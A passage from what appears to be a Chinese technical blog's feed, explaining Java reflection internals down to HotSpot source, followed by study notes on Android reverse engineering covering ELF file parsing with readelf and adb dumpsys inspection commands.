&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;获取方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;getDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method[] getDeclaredMethods() throws SecurityException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method[] getMethods() throws SecurityException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;   public Method getMethod(String name, Class&amp;lt;?&amp;gt;... parameterTypes)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;


public class test {
    public static void test1() throws IllegalAccessException, InstantiationException,
            NoSuchMethodException, InvocationTargetException {
        Class&amp;lt;?&amp;gt; c = methodClass.class;
        Object object = c.newInstance();
        Method[] methods = c.getMethods();
        Method[] declaredMethods = c.getDeclaredMethods();
        Method method = c.getMethod(&amp;quot;add&amp;quot;, int.class, int.class); //获取add方法
        System.out.println(&amp;quot;getMethods获取的方法：&amp;quot;);
        for (Method m : methods)
            System.out.println(m);
        System.out.println(&amp;quot;getDeclaredMethods获取的方法：&amp;quot;);
        for (Method m : declaredMethods)
            System.out.println(m);
    }

    public static void main(String[] args) {
        try{
            test1();

        }catch (Exception e){
            e.printStackTrace();
        }

    }
}

class methodClass {
    public final int fuck = 3;
    public int add(int a,int b) {
        return a+b;
    }
    public int sub(int a,int b) {
        return a+b;
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/20180725151348.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;获取构造器信息&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;通过Class类的getConstructor方法得到Constructor类的一个实例，而Constructor类有一个newInstance方法可以创建一个对象实例:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public T newInstance(Object ... initargs)
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;获取类的成员字段信息&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;code&gt;getFiled&lt;/code&gt;: 访问公有的成员变量&lt;/p&gt;

&lt;p&gt;&lt;code&gt;getDeclaredField&lt;/code&gt;：所有已声明的成员变量。但不能得到其父类的成员变量&lt;/p&gt;

&lt;p&gt;&lt;code&gt;getFileds&lt;/code&gt;和&lt;code&gt;getDeclaredFields&lt;/code&gt;用法同上（参照Method）&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;调用方法&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;获取到方法后使用invoke()方法来调用这个方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public Object invoke(Object obj, Object... args)
           throws IllegalAccessException, IllegalArgumentException,
              InvocationTargetException
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;eg：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class test1 {
   
       public static void main(String[] args) throws IllegalAccessException, InstantiationException, NoSuchMethodException, InvocationTargetException {
           Class&amp;lt;?&amp;gt; klass = methodClass.class;
           //创建methodClass的实例
           Object obj = klass.newInstance();
           //获取methodClass类的add方法
           Method method = klass.getMethod(&amp;quot;add&amp;quot;,int.class,int.class);
           //调用method对应的方法 =&amp;gt; add(1,4)
           Object result = method.invoke(obj,1,4);
           System.out.println(result);
       }
   
   }
   
   class methodClass {
   
       public final int fuck = 3;
       public int add(int a,int b) {
           return a+b;
       }
       public int sub(int a,int b) {
           return a+b;
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;创建数组&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static void testArray() throws ClassNotFoundException {
           Class&amp;lt;?&amp;gt; cls = Class.forName(&amp;quot;java.lang.String&amp;quot;);
           Object array = Array.newInstance(cls,25); //通过Array.newInstance()
           //往数组里添加内容
           Array.set(array,0,&amp;quot;hello&amp;quot;);  //Array类为java.lang.reflect.Array
           Array.set(array,1,&amp;quot;Java&amp;quot;);
           Array.set(array,2,&amp;quot;fuck&amp;quot;);
           Array.set(array,3,&amp;quot;Scala&amp;quot;);
           Array.set(array,4,&amp;quot;Clojure&amp;quot;);
           //获取某一项的内容
           System.out.println(Array.get(array,3));
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static Object newInstance(Class&amp;lt;?&amp;gt; componentType, int length)
           throws NegativeArraySizeException {
           return newArray(componentType, length);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   private static native Object newArray(Class&amp;lt;?&amp;gt; componentType, int length)
           throws NegativeArraySizeException;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   arrayOop Reflection::reflect_new_array(oop element_mirror, jint length, TRAPS) {
     if (element_mirror == NULL) {
       THROW_0(vmSymbols::java_lang_NullPointerException());
     }
     if (length &amp;lt; 0) {
       THROW_0(vmSymbols::java_lang_NegativeArraySizeException());
     }
     if (java_lang_Class::is_primitive(element_mirror)) {
       Klass* tak = basic_type_mirror_to_arrayklass(element_mirror, CHECK_NULL);
       return TypeArrayKlass::cast(tak)-&amp;gt;allocate(length, THREAD);
     } else {
       Klass* k = java_lang_Class::as_Klass(element_mirror);
       if (k-&amp;gt;oop_is_array() &amp;amp;&amp;amp; ArrayKlass::cast(k)-&amp;gt;dimension() &amp;gt;= MAX_DIM) {
         THROW_0(vmSymbols::java_lang_IllegalArgumentException());
       }
       return oopFactory::new_objArray(k, length, THREAD);
     }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Array类的set()和get()方法都为Native方法，在HotSpot JVM里分别对应Reflection::array_set和Reflection::array_get方法&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;获取泛型&lt;/p&gt;

&lt;p&gt;getGenericHelper(HashMap&lt;String, Person&gt; map)&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public static  void getGenericType() {
           try {
               Method method =TestHelper.class.getDeclaredMethod(&amp;quot;getGenericHelper&amp;quot;,HashMap.class);
               Type[] genericParameterTypes = method.getGenericParameterTypes();
               // 检验是否为空
               if (null == genericParameterTypes || genericParameterTypes.length &amp;lt; 1) {
                   return ;
               }
               // 取 getGenericHelper 方法的第一个参数
   
               ParameterizedType parameterizedType=(ParameterizedType)genericParameterTypes[0];
               Type rawType = parameterizedType.getRawType();
               System.out.println(&amp;quot;----&amp;gt; rawType=&amp;quot; + rawType);
               Type[] actualTypeArguments = parameterizedType.getActualTypeArguments();
               if (actualTypeArguments==genericParameterTypes || actualTypeArguments.length&amp;lt;1) {
                   return ;
               }
               //  打印出每一个类型          
               for (int i = 0; i &amp;lt; actualTypeArguments.length; i++) {
                   Type type = actualTypeArguments[i];
                   System.out.println(&amp;quot;----&amp;gt; type=&amp;quot; + type);
               }
           } catch (Exception e) {
   
           }
   
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;获得 Metho,Field,Constructor 的访问权限&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   int modifiers = method.getModifiers(); 
   Modifier.toString(modifiers); 
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;invoke方法&#34;&gt;Invoke方法&lt;/h3&gt;

&lt;p&gt;比较重点&lt;/p&gt;

&lt;p&gt;invoke方法的实现：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;@CallerSensitive
public Object invoke(Object obj, Object... args)
    throws IllegalAccessException, IllegalArgumentException,
       InvocationTargetException
{
    if (!override) {
        if (!Reflection.quickCheckMemberAccess(clazz, modifiers)) {
            Class&amp;lt;?&amp;gt; caller = Reflection.getCallerClass();
            checkAccess(caller, clazz, obj, modifiers);
        }
    }
    MethodAccessor ma = methodAccessor;             // read volatile
    if (ma == null) {
        ma = acquireMethodAccessor();
    }
    return ma.invoke(obj, args);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;权限检查&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;首先检查AccessibleObject的override属性的值 。AccessibleObject 类是 Field、Method 和 Constructor 对象的基类 。override 默认为false,调试需要权限调用规则，反正不需要。&lt;/p&gt;

&lt;p&gt;默认情况下首先用Reflection.quickCheckMemberAccess(clazz, modifiers)方法检查方法是否为public，如果是的话跳出本步；如果不是public方法，那么用Reflection.getCallerClass()方法获取调用这个方法的Class对象，这是一个native方法:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   @CallerSensitive
       public static native Class&amp;lt;?&amp;gt; getCallerClass();
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   JNIEXPORT jclass JNICALL Java_sun_reflect_Reflection_getCallerClass__
   (JNIEnv *env, jclass unused)
   {
       return JVM_GetCallerClass(env, JVM_CALLER_DEPTH);
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;   JVM_ENTRY(jclass, JVM_GetCallerClass(JNIEnv* env, int depth))
     JVMWrapper(&amp;quot;JVM_GetCallerClass&amp;quot;);
   
     // Pre-JDK 8 and early builds of JDK 8 don&#39;t have a CallerSensitive annotation; or
     // sun.reflect.Reflection.getCallerClass with a depth parameter is provided
     // temporarily for existing code to use until a replacement API is defined.
     if (SystemDictionary::reflect_CallerSensitive_klass() == NULL || depth != JVM_CALLER_DEPTH) {
       Klass* k = thread-&amp;gt;security_get_caller_class(depth);
       return (k == NULL) ? NULL : (jclass) JNIHandles::make_local(env, k-&amp;gt;java_mirror());
     }
   
     // Getting the class of the caller frame.
     //
     // The call stack at this point looks something like this:
     //
     // [0] [ @CallerSensitive public sun.reflect.Reflection.getCallerClass ]
     // [1] [ @CallerSensitive API.method                                   ]
     // [.] [ (skipped intermediate frames)                                 ]
     // [n] [ caller                                                        ]
     vframeStream vfst(thread);
     // Cf. LibraryCallKit::inline_native_Reflection_getCallerClass
     for (int n = 0; !vfst.at_end(); vfst.security_next(), n++) {
       Method* m = vfst.method();
       assert(m != NULL, &amp;quot;sanity&amp;quot;);
       switch (n) {
       case 0:
         // This must only be called from Reflection.getCallerClass
         if (m-&amp;gt;intrinsic_id() != vmIntrinsics::_getCallerClass) {
           THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), &amp;quot;JVM_GetCallerClass must only be called from Reflection.getCallerClass&amp;quot;);
         }
         // fall-through
       case 1:
         // Frame 0 and 1 must be caller sensitive.
         if (!m-&amp;gt;caller_sensitive()) {
           THROW_MSG_NULL(vmSymbols::java_lang_InternalError(), err_msg(&amp;quot;CallerSensitive annotation expected at frame %d&amp;quot;, n));
         }
         break;
       default:
         if (!m-&amp;gt;is_ignored_by_security_stack_walk()) {
           // We have reached the desired frame; return the holder class.
           return (jclass) JNIHandles::make_local(env, m-&amp;gt;method_holder()-&amp;gt;java_mirror());
         }
         break;
       }
     }
     return NULL;
   JVM_END
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;获取了这个Class对象caller后用checkAccess方法做一次快速的权限校验 :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   volatile Object securityCheckCache;
   
       void checkAccess(Class&amp;amp;lt;?&amp;amp;gt; caller, Class&amp;amp;lt;?&amp;amp;gt; clazz, Object obj, int modifiers)
           throws IllegalAccessException
       {
           if (caller == clazz) {  // 快速校验
               return;             // 权限通过校验
           }
           Object cache = securityCheckCache;  // read volatile
           Class&amp;amp;lt;?&amp;amp;gt; targetClass = clazz;
           if (obj != null
               &amp;amp;amp;&amp;amp;amp; Modifier.isProtected(modifiers)
               &amp;amp;amp;&amp;amp;amp; ((targetClass = obj.getClass()) != clazz)) {
               // Must match a 2-list of { caller, targetClass }.
               if (cache instanceof Class[]) {
                   Class&amp;amp;lt;?&amp;amp;gt;[] cache2 = (Class&amp;amp;lt;?&amp;amp;gt;[]) cache;
                   if (cache2[1] == targetClass &amp;amp;amp;&amp;amp;amp;
                       cache2[0] == caller) {
                       return;     // ACCESS IS OK
                   }
                   // (Test cache[1] first since range check for [1]
                   // subsumes range check for [0].)
               }
           } else if (cache == caller) {
               // Non-protected case (or obj.class == this.clazz).
               return;             // ACCESS IS OK
           }
   
           // If no return, fall through to the slow path.
           slowCheckMemberAccess(caller, clazz, obj, modifiers, targetClass);
       }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;先快速检查，未通过的话建立缓存，中间再检查；&lt;/p&gt;

&lt;p&gt;如果都没有通过：进行更详细的检查;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   // Keep all this slow stuff out of line:
   void slowCheckMemberAccess(Class&amp;amp;lt;?&amp;amp;gt; caller, Class&amp;amp;lt;?&amp;amp;gt; clazz, Object obj, int modifiers,
                              Class&amp;amp;lt;?&amp;amp;gt; targetClass)
       throws IllegalAccessException
   {
       Reflection.ensureMemberAccess(caller, clazz, obj, modifiers);
   
       // Success: Update the cache.
       Object cache = ((targetClass == clazz)
                       ? caller
                       : new Class&amp;amp;lt;?&amp;amp;gt;[] { caller, targetClass });
   
       // Note:  The two cache elements are not volatile,
       // but they are effectively final.  The Java memory model
       // guarantees that the initializing stores for the cache
       // elements will occur before the volatile write.
       securityCheckCache = cache;         // write volatile
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;用Reflection.ensureMemberAccess方法继续检查权限，若检查通过就更新缓存，这样下一次同一个类调用同一个方法时就不用执行权限检查了，这是一种简单的缓存机制。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;调用MethodAccessor的invoke方法&lt;/p&gt;

&lt;p&gt;由sun.reflect.MethodAccessor 处理&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   /** This interface provides the declaration for
       java.lang.reflect.Method.invoke(). Each Method object is
       configured with a (possibly dynamically-generated) class which
       implements this interface.
   */
    public interface MethodAccessor {    //是一个接口
       /** Matches specification in {@link java.lang.reflect.Method} */
       public Object invoke(Object obj, Object[] args)
           throws IllegalArgumentException, InvocationTargetException;
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;分析其Usage可得它的具体实现类有:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;sun.reflect.DelegatingMethodAccessorImpl&lt;/li&gt;
&lt;li&gt;sun.reflect.MethodAccessorImpl&lt;/li&gt;
&lt;li&gt;sun.reflect.NativeMethodAccessorImpl&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;methodAccessor实例由reflectionFactory对象操控生成，它在AccessibleObject下的声明如下:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   // Reflection factory used by subclasses for creating field,
   // method, and constructor accessors. Note that this is called
   // very early in the bootstrapping process.
   static final ReflectionFactory reflectionFactory =
       AccessController.doPrivileged(
           new sun.reflect.ReflectionFactory.GetReflectionFactoryAction());
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;sun.reflect.ReflectionFactory类的源码：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;   public class ReflectionFactory {
       
       private static boolean initted = false;
       private static Permission reflectionFactoryAccessPerm
           = new RuntimePermission(&amp;quot;reflectionFactoryAccess&amp;quot;);
       private static ReflectionFactory soleInstance = new ReflectionFactory();
       // Provides access to package-private mechanisms in java.lang.reflect
       private static volatile LangReflectAccess langReflectAccess;
       
       // 这里设计得非常巧妙
       // &amp;quot;Inflation&amp;quot; mechanism. Loading bytecodes to implement
       // Method.invoke() and Constructor.newInstance() currently costs
       // 3-4x more than an invocation via native code for the first
       // invocation (though subsequent invocations have been benchmarked
       // to be over 20x faster). Unfortunately this cost increases
       // startup time for certain applications that use reflection
       // intensively (but only once per class) to bootstrap themselves.
       // To avoid this penalty we reuse the existing JVM entry points
       // for the first few invocations of Methods and Constructors and
       // then switch to the bytecode-based implementations.
       //
       // Package-private to be accessible to NativeMethodAccessorImpl
       // and NativeConstructorAccessorImpl
       private static boolean noInflation        = false;
       private static int     inflationThreshold = 15;
       
       //......
       
    //这是生成MethodAccessor的方法
       public MethodAccessor newMethodAccessor(Method method) {
           checkInitted();
       
           if (noInflation &amp;amp;&amp;amp; !ReflectUtil.isVMAnonymousClass(method.getDeclaringClass())) {
               return new MethodAccessorGenerator().
                   generateMethod(method.getDeclaringClass(),
                                  method.getName(),
                                  method.getParameterTypes(),
                                  method.getReturnType(),
                                  method.getExceptionTypes(),
                                  method.getModifiers());
           } else {
               NativeMethodAccessorImpl acc =
                   new NativeMethodAccessorImpl(method);
               DelegatingMethodAccessorImpl res =
                   new DelegatingMethodAccessorImpl(acc);
               acc.setParent(res);
               return res;
           }
       }
       
       //......
       
       /** We have to defer full initialization of this class until after
       the static initializer is run since java.lang.reflect.Method&#39;s
       static initializer (more properly, that for
       java.lang.reflect.AccessibleObject) causes this class&#39;s to be
       run, before the system properties are set up. */
       private static void checkInitted() {
           if (initted) return;
           AccessController.doPrivileged(
               new PrivilegedAction&amp;lt;Void&amp;gt;() {
                   public Void run() {
                       // Tests to ensure the system properties table is fully
                       // initialized. This is needed because reflection code is
                       // called very early in the initialization process (before
                       // command-line arguments have been parsed and therefore
                       // these user-settable properties installed.) We assume that
                       // if System.out is non-null then the System class has been
                       // fully initialized and that the bulk of the startup code
                       // has been run.
       
                       if (System.out == null) {
                           // java.lang.System not yet fully initialized
                           return null;
                       }
       
                       String val = System.getProperty(&amp;quot;sun.reflect.noInflation&amp;quot;);
                       if (val != null &amp;amp;&amp;amp; val.equals(&amp;quot;true&amp;quot;)) {
                           noInflation = true;
                       }
       
                       val = System.getProperty(&amp;quot;sun.reflect.inflationThreshold&amp;quot;);
                       if (val != null) {
                           try {
                               inflationThreshold = Integer.parseInt(val);
                           } catch (NumberFormatException e) {
                               throw new RuntimeException(&amp;quot;Unable to parse property sun.reflect.inflationThreshold&amp;quot;, e);
                           }
                       }
       
                       initted = true;
                       return null;
                   }
               });
       }
   }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;MethodAccessor实现有两个版本，一个是Java版本，一个是native版本 。&lt;/p&gt;

&lt;p&gt;Java实现的版本在初始化时需要较多时间，但长久来说性能较好；native版本正好相反，启动时相对较快，但运行时间长了之后速度就比不过Java版了&lt;/p&gt;

&lt;p&gt;为了尽可能地减少性能损耗，HotSpot JDK采用“inflation”的技巧：让Java方法在被反射调用时，开头若干次使用native版，等反射调用次数超过阈值时则生成一个专用的MethodAccessor实现类，生成其中的invoke()方法的字节码，以后对该Java方法的反射调用就会使用Java版本。 这项优化是从JDK 1.4开始的。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;在JVM层面探究invoke0方法&lt;/p&gt;

&lt;p&gt;invoke0方法是一个native方法,它在HotSpot JVM里调用JVM_InvokeMethod函数:&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;          JNIEXPORT jobject JNICALL Java_sun_reflect_NativeMethodAccessorImpl_invoke0
          (JNIEnv *env, jclass unused, jobject m, jobject obj, jobjectArray args)
          {
              return JVM_InvokeMethod(env, m, obj, args);
          }
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;openjdk/hotspot/src/share/vm/prims/jvm.cpp&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;JVM_ENTRY(jobject, JVM_InvokeMethod(JNIEnv *env, jobject method, jobject obj, jobjectArray args0))
  JVMWrapper(&amp;quot;JVM_InvokeMethod&amp;quot;);
  Handle method_handle;
  if (thread-&amp;gt;stack_available((address) &amp;amp;method_handle) &amp;gt;= JVMInvokeMethodSlack) {
    method_handle = Handle(THREAD, JNIHandles::resolve(method));
    Handle receiver(THREAD, JNIHandles::resolve(obj));
    objArrayHandle args(THREAD, objArrayOop(JNIHandles::resolve(args0)));
    oop result = Reflection::invoke_method(method_handle(), receiver, args, CHECK_NULL);
    jobject res = JNIHandles::make_local(env, result);
    if (JvmtiExport::should_post_vm_object_alloc()) {
      oop ret_type = java_lang_reflect_Method::return_type(method_handle());
      assert(ret_type != NULL, &amp;quot;sanity check: ret_type oop must not be NULL!&amp;quot;);
      if (java_lang_Class::is_primitive(ret_type)) {
        // Only for primitive type vm allocates memory for java object.
        // See box() method.
        JvmtiExport::post_vm_object_alloc(JavaThread::current(), result);
      }
    }
    return res;
  } else {
    THROW_0(vmSymbols::java_lang_StackOverflowError());
  }
JVM_END
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;openjdk/hotspot/src/share/vm/runtime/reflection.cpp :&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;oop Reflection::invoke_method(oop method_mirror, Handle receiver, objArrayHandle args, TRAPS) {
  oop mirror             = java_lang_reflect_Method::clazz(method_mirror);
  int slot               = java_lang_reflect_Method::slot(method_mirror);
  bool override          = java_lang_reflect_Method::override(method_mirror) != 0;
  objArrayHandle ptypes(THREAD, objArrayOop(java_lang_reflect_Method::parameter_types(method_mirror)));

  oop return_type_mirror = java_lang_reflect_Method::return_type(method_mirror);
  BasicType rtype;
  if (java_lang_Class::is_primitive(return_type_mirror)) {
    rtype = basic_type_mirror_to_basic_type(return_type_mirror, CHECK_NULL);
  } else {
    rtype = T_OBJECT;
  }

  instanceKlassHandle klass(THREAD, java_lang_Class::as_Klass(mirror));
  Method* m = klass-&amp;gt;method_with_idnum(slot);
  if (m == NULL) {
    THROW_MSG_0(vmSymbols::java_lang_InternalError(), &amp;quot;invoke&amp;quot;);
  }
  methodHandle method(THREAD, m);

  return invoke(klass, method, receiver, override, ptypes, rtype, args, true, THREAD);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;ol&gt;
&lt;li&gt;Java版的实现&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Java版MethodAccessor的生成使用MethodAccessorGenerator实现  下面是开头的注释：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;/** Generator for sun.reflect.MethodAccessor and
    sun.reflect.ConstructorAccessor objects using bytecodes to
    implement reflection. A java.lang.reflect.Method or
    java.lang.reflect.Constructor object can delegate its invoke or
    newInstance method to an accessor using native code or to one
    generated by this class. (Methods and Constructors were merged
    together in this class to ensure maximum code sharing.) */
&lt;/code&gt;&lt;/pre&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析-基础篇④</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</link>
      <pubDate>Sun, 22 Jul 2018 14:15:38 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%874/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇④&#34;&gt;一、 基础篇④&lt;/h2&gt;

&lt;h3 id=&#34;第四章-so文件格式解析&#34;&gt;第四章 so文件格式解析&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;ELF文件格式&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;so文件-&amp;gt;elf文件，文件格式看图（引用自@非虫）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/elf_feichong.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;解析工具&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;readelf  常用命令

&lt;ul&gt;
&lt;li&gt;readelf -h xxx.so 查头部信息&lt;/li&gt;
&lt;li&gt;readelf -S xxx.so 查节（Section）信息&lt;/li&gt;
&lt;li&gt;readelf -l xxx.so 查段（Program）信息&lt;/li&gt;
&lt;li&gt;readelf -a xxx.so 查全部信息&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;解析ELF文件&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;动手解析一个elf文件  。。。&lt;/p&gt;

&lt;p&gt;太水 这里的内容&lt;/p&gt;

&lt;p&gt;直接去看源码实现用java解析elf文件信息&lt;a href=&#34;https://github.com/fourbrother/parse_androidso&#34;&gt;https://github.com/fourbrother/parse_androidso&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ELF 相关内容还是单独详细分析 单独写一篇吧&lt;/p&gt;

&lt;p&gt;ELF书籍《&lt;a href=&#34;https://item.jd.com/12240585.html&#34;&gt;Linux二进制分析&lt;/a&gt;》&lt;/p&gt;

&lt;p&gt;### 总结&lt;/p&gt;

&lt;p&gt;加固脱壳必须掌握的知识点。&lt;/p&gt;
</description>
      
    </item>
    
    <item>
      <title>Android应用安全防护和逆向分析 基础篇③</title>
      <link>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</link>
      <pubDate>Mon, 16 Jul 2018 13:51:50 +0800</pubDate>
      
      <guid>https://naivete.cc/post/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%873/</guid>
      
        <description>

&lt;h2 id=&#34;一-基础篇③&#34;&gt;一、 基础篇③&lt;/h2&gt;

&lt;h3 id=&#34;第三章-android中开发与逆向常用命令总结&#34;&gt;第三章 Android中开发与逆向常用命令总结&lt;/h3&gt;

&lt;h4 id=&#34;1-基础命令&#34;&gt;1. 基础命令&lt;/h4&gt;

&lt;h5 id=&#34;1-1-cat命令&#34;&gt;1.1 cat命令&lt;/h5&gt;

&lt;p&gt;​   查看文件内容  结合grep进行过滤&lt;/p&gt;

&lt;h5 id=&#34;1-2-echo-touch命令&#34;&gt;1.2 echo/touch命令&lt;/h5&gt;

&lt;p&gt;​   写文件   配个定向符使用&lt;/p&gt;

&lt;h4 id=&#34;2-非shell命令&#34;&gt;2. 非shell命令&lt;/h4&gt;

&lt;h5 id=&#34;2-1-adb-shell-dumpsys-sctivity-top&#34;&gt;2.1 adb shell dumpsys sctivity top&lt;/h5&gt;

&lt;p&gt;​   说明：查看当前应用的activity信息&lt;/p&gt;

&lt;p&gt;​   用法：运行需要查看的应用&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   如果直接运行  &lt;code&gt;adb shell dmpsys&lt;/code&gt;会把当前系统中的所有应用运行的四大组件都打印出来 内容非常多 使用信息重定向来进行选择：可借助Windows的&lt;code&gt;start&lt;/code&gt;命令&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-2.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-2-adb-shell-dumpsys-package&#34;&gt;2.2 adb shell dumpsys package&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定包名应用的详细信息 （相当于AndroidManifest.xml的内容）&lt;/p&gt;

&lt;p&gt;​   用法：adb shell dumpsys package [pkgname]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/android-note-3-3.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;h5 id=&#34;2-3-adb-shell-dumpsys-meminfo&#34;&gt;2.3 adb shell dumpsys meminfo&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定进程名或者进程id的内存信息&lt;/p&gt;

&lt;p&gt;​   用法：adb shell dumpsys meminfo [pname/pid]&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://my-md-1253484710.coscd.myqcloud.com/adnroid-note-3-4.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   和后面的top命令结合使用 可以分析应用的性能消耗情况&lt;/p&gt;

&lt;h5 id=&#34;2-4-adb-shell-dump-dbnfo&#34;&gt;2.4 adb shell dump dbnfo&lt;/h5&gt;

&lt;p&gt;​   说明：查看指定包名应用的数据库存储信息（包括存储的SQL语句）&lt;/p&gt;

